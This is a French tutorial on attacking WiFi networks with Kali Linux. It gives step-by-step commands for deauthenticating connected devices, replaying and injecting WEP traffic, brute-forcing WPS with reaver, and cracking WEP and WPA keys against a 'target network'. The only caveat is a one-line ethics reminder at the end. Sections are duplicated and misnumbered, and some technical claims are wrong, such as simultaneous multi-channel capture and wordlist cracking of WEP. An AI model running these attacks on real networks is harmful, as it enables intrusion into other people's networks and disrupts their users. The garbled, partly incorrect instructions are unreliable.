
# Guide complet sur l'utilisation de Kali Linux pour les tests de sécurité WiFi

## Introduction

Kali Linux est une distribution Linux spécialisée dans les tests de sécurité et les audits de vulnérabilité. Dans ce guide, nous explorerons l'utilisation de Kali Linux pour les tests de sécurité liés au WiFi. Nous couvrirons les étapes du scan des réseaux à la capture de paquets, en mettant l'accent sur l'exploitation de vulnérabilités telles que le WEP, le WPA, et les failles WPS.

## 1. Préparation de l'environnement

Avant de commencer, assurez-vous d'avoir une carte réseau compatible avec le mode de surveillance. Vous pouvez vérifier la compatibilité avec la commande suivante :

```bash
iw list
```
Lorsque vous exécutez la commande `iw list`, vous obtenez des informations détaillées sur toutes les interfaces WiFi disponibles sur votre système. Pour préparer l'environnement et vérifier la compatibilité de votre carte WiFi avec le mode de surveillance, assurez-vous de rechercher les informations suivantes dans la sortie de la commande :

1. **Mode de fonctionnement :** Vérifiez que le mode de fonctionnement de votre carte WiFi prend en charge le mode de surveillance. Recherchez une ligne similaire à "Supported interface modes" et assurez-vous que "Monitor" est répertorié.

2. **Fréquences supportées :** Assurez-vous que votre carte WiFi supporte les fréquences nécessaires pour la surveillance. Recherchez les sections qui mentionnent "Frequencies" et vérifiez que les fréquences 2.4 GHz et/ou 5 GHz sont prises en charge.

3. **Capacités de la carte :** Recherchez des informations sur les capacités de la carte, telles que la prise en charge des canaux, des débits, etc. Ces informations peuvent vous aider à choisir le meilleur canal pour la surveillance.

Voici un exemple simplifié de ce à quoi pourrait ressembler une partie de la sortie de `iw list` :

```bash
Wiphy phy0
    max # scan SSIDs: 4
    max scan IEs length: 2257 bytes
    Retry short limit: 7
    Retry long limit: 4
    Coverage class: 0 (up to 0m)
    Available Antennas: TX 0 RX 0
    Supported interface modes:
         * IBSS
         * managed
         * AP
         * AP/VLAN
         * monitor
         * P2P-client
         * P2P-GO
         * P2P-device
    Band 1:
        Capabilities: 0x16e
            RX LDPC
            HT20/HT40
            SM Power Save disabled
            RX HT20 SGI
            RX HT40 SGI
            No RX STBC
```

Dans cet exemple, la carte WiFi prend en charge le mode "monitor", ce qui est essentiel pour les tests de sécurité liés au WiFi. Assurez-vous que votre carte WiFi affiche une prise en charge similaire avant de procéder aux tests.

## 2. Scan des réseaux WiFi


### 2.1 Identification de la carte WiFi

Utilisez la commande `iwconfig` pour afficher toutes les interfaces réseau disponibles. Identifiez votre carte WiFi parmi les interfaces listées.

```bash
iwconfig
```

Assurez-vous de noter le nom de l'interface WiFi que vous souhaitez utiliser (par exemple, `wlan0`).

### 2.2 Passage en mode monitor

Avant de lancer le scan des réseaux WiFi, mettez l'interface WiFi en mode monitor avec la commande `airmon-ng`. Remplacez `wlan0` par le nom de votre interface WiFi.

```bash
sudo airmon-ng start wlan0
```

Cela créera une nouvelle interface, généralement appelée `wlan0mon`, en mode monitor. Vous pouvez vérifier cela à l'aide de la commande `iwconfig` :

```bash
iwconfig
```

Assurez-vous que votre interface WiFi est maintenant en mode monitor.

### 2.3 Scan des réseaux WiFi

Utilisez l'outil `airodump-ng` pour scanner les réseaux WiFi disponibles avec votre interface WiFi en mode monitor. Remplacez `wlan0mon` par le nom de votre interface monitor.

```bash
sudo airodump-ng wlan0mon
```

Vous verrez alors une liste des réseaux WiFi à proximité avec des informations détaillées.

Ces étapes garantissent que vous utilisez la bonne carte WiFi et qu'elle est configurée en mode monitor pour le scan des réseaux.


## 3. Capture de paquets basique avec airodump-ng

La capture de paquets est une étape cruciale dans les tests de sécurité WiFi. Utilisez `airodump-ng` pour surveiller et capturer les paquets échangés sur le réseau cible.

### 3.1 Lancement de airodump-ng

Utilisez la commande suivante pour lancer `airodump-ng` sur l'interface WiFi en mode monitor. Remplacez `wlan0mon` par le nom de votre interface monitor.

```bash
sudo airodump-ng wlan0mon
```

### 3.2 Choix du réseau cible

Repérez le BSSID (adresse MAC du routeur) du réseau cible ainsi que le canal sur lequel il opère.

### 3.3 Capture de paquets du réseau cible

Relancez `airodump-ng`, cette fois en spécifiant le BSSID et le canal du réseau cible. Les données seront enregistrées dans un fichier de capture.

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture_file wlan0mon
```

La capture basique est maintenant en cours. Cependant, pour augmenter le nombre de paquets capturés, vous pouvez effectuer des actions supplémentaires en parallèle.

Voici comment spécifier plusieurs canaux dans la commande `airodump-ng` :

```bash
sudo airodump-ng -c 1,6,11 --bssid <BSSID> -w capture_file wlan0mon
```

Dans cet exemple, les canaux 1, 6 et 11 sont spécifiés avec l'option `-c`, séparés par des virgules. Assurez-vous de remplacer `<BSSID>` par l'adresse MAC du réseau cible.

Cette commande permettra à `airodump-ng` de capturer des paquets des réseaux fonctionnant sur les canaux 1, 6 et 11 simultanément. Cette approche peut être particulièrement efficace lorsque vous souhaitez cibler des réseaux qui utilisent plusieurs canaux pour optimiser la performance du réseau WiFi.

N'oubliez pas que la carte WiFi utilisée doit être capable de capturer des paquets sur plusieurs canaux simultanément pour que cette technique fonctionne correctement.

## 4. Augmentation du nombre de paquets capturés

### 4.1 Déauthentification (DEAUTH)

Lancez une attaque de déauthentification pour forcer les périphériques connectés à se déconnecter, générant ainsi plus de paquets lorsqu'ils se reconnectent.

```bash
sudo aireplay-ng --deauth <nombre_de_deauth_packets> -a <BSSID> wlan0mon
```

### 4.2 Rejeu de paquets (Replay)

Si le réseau utilise le chiffrement WEP, capturez du trafic chiffré puis rejouez ces paquets pour générer plus de données utiles.

Capturez les paquets :

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w wep_capture_file wlan0mon
```

Rejouez les paquets :

```bash
sudo aireplay-ng -2 -b <BSSID> -h <votre_adresse_mac> -r wep_capture_file wlan0mon
```

### 4.3 Injection de trafic

Utilisez `aireplay-ng` pour injecter du trafic supplémentaire sur le réseau cible.

```bash
sudo aireplay-ng -9 wlan0mon
```

## 5. Analyse des paquets avec Wireshark

Ouvrez le fichier de capture avec Wireshark pour analyser les paquets en détail.

```bash
wireshark capture_file-01.cap
```

Explorez les paquets pour identifier des anomalies, des faiblesses de sécurité ou d'autres informations pertinentes.

En suivant ces étapes, vous maximisez la quantité de données capturées, ce qui peut être crucial pour des attaques ultérieures, notamment lors de la cassure des clés WEP ou WPA.

### 3.2 Capture de paquets WPS

Si le réseau cible utilise WPS, capturez également les paquets WPS pour faciliter l'exploitation ultérieure.

```bash
sudo wash -i wlan0
sudo reaver -i wlan0 -b <BSSID> -c <channel> -vv
```

## 4. Exploitation des vulnérabilités

### 4.1 Attaque WEP

Si le réseau cible utilise WEP, utilisez `aircrack-ng` pour casser la clé WEP à partir de la capture de paquets.

```bash
sudo aircrack-ng -b <BSSID> -w wordlist.txt capture_file-01.cap
```

### 4.2 Attaque WPA

Si le réseau cible utilise WPA, utilisez `aircrack-ng` avec une attaque par dictionnaire ou par force brute.

```bash
sudo aircrack-ng -w wordlist.txt capture_file-01.cap
```

### 4.3 Attaque WPS

Si le réseau cible utilise WPS, utilisez `reaver` pour exploiter la faille WPS et obtenir la clé WiFi.

```bash
sudo reaver -i wlan0 -b <BSSID> -c <channel> -vv
```

## 5. Analyse des paquets avec Wireshark

Ouvrez le fichier de capture avec Wireshark pour analyser les paquets en détail.

```bash
wireshark capture_file-01.cap
```

Explorez les paquets pour identifier des anomalies, des faiblesses de sécurité, ou d'autres informations pertinentes.

## Conclusion

Ce guide fournit une introduction complète à l'utilisation de Kali Linux pour les tests de sécurité liés au WiFi. Assurez-vous d'agir conformément à la législation en vigueur et de respecter la vie privée des autres lors de l'utilisation de ces techniques. Utilisez ces compétences de manière éthique et responsable.
